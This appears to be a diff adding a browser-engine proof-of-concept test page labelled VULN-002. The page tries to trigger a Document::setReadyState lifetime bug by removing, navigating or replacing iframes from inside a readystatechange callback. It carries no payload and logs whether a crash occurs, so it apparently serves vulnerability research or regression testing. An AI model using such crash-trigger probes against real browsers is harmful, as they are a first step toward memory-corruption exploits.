@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>VULN-002 Document setReadyState lifetime</title></head>
+<body><pre id="log">POC STARTED: VULN-002 Document::setReadyState
+</pre>
+<script>
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+let current=null, token=0, done=false;
+function finish(){ if(done) return; done=true; log('NO CRASH OBSERVED'); log('DONE'); if(window.testRunner) testRunner.notifyDone(); }
+window.__ps5ReadyStateAction = function(t, variant, state){
+    log('ACTION: parent callback token=' + t + ' readyState=' + state + ' variant=' + variant);
+    let f=current;
+    try {
+        if (variant===0) { log('ACTION: iframe remove'); if(f) f.remove(); }
+        else if (variant===1) { log('ACTION: iframe navigation'); if(f) f.src='about:blank'; }
+        else if (variant===2) { log('ACTION: iframe replacement'); if(f&&f.parentNode){ let n=document.createElement('iframe'); f.parentNode.replaceChild(n,f); current=n; } }
+        else if (variant===3) { log('ACTION: iframe remove microtask scheduled'); Promise.resolve().then(function(){ try{ if(f) f.remove(); log('ACTION: microtask remove completed'); }catch(e){ log('ACTION: microtask remove threw '+e.name); } }); }
+        else { log('ACTION: iframe remove timeout scheduled'); setTimeout(function(){ try{ if(f) f.remove(); log('ACTION: timeout remove completed'); }catch(e){ log('ACTION: timeout remove threw '+e.name); } },0); }
+        log('ACTION: parent action completed');
+    } catch(e) { log('ACTION: parent action threw ' + e.name); }
+};
+async function scenario(v){
+    log('PHASE: create iframe variant ' + v);
+    let f=document.createElement('iframe'); current=f; document.body.appendChild(f);
+    let t=++token;
+    let child = '<!DOCTYPE html><html><body><script>function send(m){parent.document.getElementById("log").textContent+=m+"\\n";} document.onreadystatechange=function(){ try{ send("ACTION: readystatechange fired"); send("ACTION: current readyState " + document.readyState); send("ACTION: before listener action"); parent.__ps5ReadyStateAction('+t+','+v+',document.readyState); send("ACTION: after listener action"); }catch(e){ send("ACTION: child handler threw " + e.name); } };<\\/script><p>child</p></body></html>';
+    try { f.srcdoc=child; log('ACTION: srcdoc assigned'); } catch(e) { log('ACTION: srcdoc assignment threw '+e.name); }
+    await new Promise(r => setTimeout(r, 120));
+    log('PHASE: scenario complete ' + v);
+    try { if (f && f.parentNode) f.remove(); } catch(e) { log('ACTION: cleanup threw '+e.name); }
+}
+(async function run(){ log('PHASE: begin bounded scenarios'); for(let v=0; v<5; ++v) await scenario(v); finish(); })();
+setTimeout(function(){ log('PHASE: failsafe timeout'); finish(); }, 3000);
+</script></body></html>
